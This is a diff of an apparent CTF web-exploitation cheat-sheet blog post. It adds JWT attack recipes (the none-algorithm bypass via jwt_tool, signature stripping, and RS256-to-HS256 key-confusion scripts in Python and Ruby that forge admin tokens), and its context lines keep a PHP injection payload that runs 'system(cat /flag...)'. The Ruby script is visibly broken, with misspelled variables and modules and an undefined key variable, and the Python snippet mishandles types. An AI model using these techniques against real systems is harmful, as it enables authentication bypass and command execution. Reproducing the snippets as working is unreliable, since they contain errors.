@@ -4,6 +4,7 @@ categories:
   - CTF
 tags:
   - ctf
+modified: 2021-01-21
 ---
 CTF Collection, only Web Exploitation.
 
@@ -70,7 +71,7 @@ Let's `cat` the flag!
 
 <a href="/assets/images/ctf/bamboo/11.png"><img src="/assets/images/ctf/bamboo/11.png"></a>
 
-##### Resource:
+##### Resources:
 > - [https://www.anquanke.com/post/id/220813#h3-2](https://www.anquanke.com/post/id/220813#h3-2)
 - [https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math](https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math)
 
@@ -108,9 +109,95 @@ The result:
 
 Alternative: `%E3%83%BD(%23%60%D0%94%C2%B4)%EF%BE%89[0/*]=1*/]);system("cat%20/flag_de42537a7dd854f4ce27234a103d4362");/*`.
 
-##### Resource:
+##### Resources:
 > - [https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md](https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md)
 - [https://spotless.tech/bambooctf-2021-angryface-php.html](https://spotless.tech/bambooctf-2021-angryface-php.html)
+
+
+## JWT bypass using None algorithm
+Using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool).
+
+Step:
+- Tamper the JWT
+
+  ```bash
+  $ python3 jwt_tool.py jwt -T
+  ```
+
+- Use None algorithm
+
+  ```bash
+  python3 jwt_tool.py jwt -Xa (using none algorithm)
+  ```
+
+- ALTERNATIVE: remove the signature
+
+  ```
+  Example:
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.NWU2MWNiMjg0YWU3NDM0ZDFmYjYwNTYyY2RmNzNkMzM4NDdhZDE4YTUxZjYwZmI3NTI3Y2Y5YjNiYjMyMzlhOA
+
+  Remove the signature:
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.
+  ```
+
+##### Resources:
+> - [https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)
+
+
+## JWT bypass with public key 
+Using python:
+
+```python
+import hmac
+import base64
+import hashlib
+
+f = open("public.pem")
+key = f.read()
+# RS -> HS and login -> admin
+str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"
+
+sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+print(str+"."+sig)
+```
+
+Using ruby:
+
+```ruby
+require 'base64'
+require 'openssl'
+
+f = File.open("public.pem").read
+
+TOKEN = "FULLJWTTOKENHERE"
+
+header, payload, signature = TOKEN.split('.')
+
+decoded_header = Base64.decode64(header)
+decoder_header.gsub!("RS256", "HS256")
+puts decoded_header
+new_header = Bas64.strict_encode64(decoded_header).gsub("=","")
+
+decoded_payload = Base64.decode64(payload)
+decoder_payload.gsub!("your_user_here", "admin")
+puts decoded_payload
+new_payload = Bas64.strict_encode64(decoded_payload).gsub("=","")
+
+data = new_header + "." + new_payload
+
+signature = Bas64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), pub, data))
+```
+
+## JWT bypass no verify
+This only works if the server didn't verify the signature. We can tamper the JWT using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool). Step-by-step:
+- Tamper the JWT
+
+  ```bash
+  $ python3 jwt_tool.py jwt -T
+  ```
+
+- Profit
 
 
 
